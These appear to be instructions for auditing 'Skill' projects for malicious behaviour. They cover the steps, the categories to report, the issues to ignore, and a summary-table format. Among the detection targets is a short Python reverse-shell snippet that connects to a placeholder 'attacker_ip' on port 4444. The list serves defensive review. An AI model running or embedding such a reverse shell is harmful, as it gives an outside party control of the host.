## Skill Project Audit Focus

This audit targets **obvious malicious behavior and high-risk vulnerabilities only**. Ignore general development convention issues.

## Execution Steps

1. Read `SKILL.md` to understand the functional description, parameter definitions, and expected outcomes.
2. Scan all script files under `scripts/` and analyze the actual execution logic.
3. Focus on detecting **malicious behavior patterns**, not general inconsistencies.

## 1. Malicious Behavior Detection (Must Report)

The following behaviors **must** be reported as high-risk/critical vulnerabilities:

- **Reverse Shell**: Establishing a reverse connection to an external server
  ```python
  import socket, subprocess, os
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("attacker_ip", 4444))
  os.dup2(s.fileno(), 0)
  ```
- **Data Exfiltration**: Transmitting sensitive information (credentials, file contents) to external servers.
- **Backdoor Implantation**: Creating persistence mechanisms for unauthorized access.
- **Cryptomining Code**: Logic related to cryptocurrency mining.
- **Arbitrary File Read/Write**: Unauthorized reading or modification of sensitive system files.

## 2. Intent Alignment

- Does the actual core logic of the code fully match its description, and does it trigger dangerous logic?
- **Hidden Behaviors**: Does the code implement any **malicious functionality** not mentioned in the description?

## 3. Ignorable Issues (Do Not Report)

- Code quality issues (unhandled exceptions, improper logging)
- General development convention issues (hardcoded test paths)
- Output format inconsistencies (non-security-related)
- Low-risk information leakage (no network transmission path)

## Skill Audit Output Requirements

If a Skill project is detected, include an **Intent Alignment Audit Summary Table** at the beginning of the report:

| Check Item          | Status (Pass / Warning / Critical) | Summary |
| :------------------ | :---------------------------------- | :------ |
| Malicious Behavior  | ...                                 | ...     |
| Hidden Behaviors    | ...                                 | ...     |
| Intent Alignment    | ...                                 | ...     |

## 4. Guidelines

- Do not use emoji in the report.
- Do not use `---` (horizontal rule) syntax in Markdown.
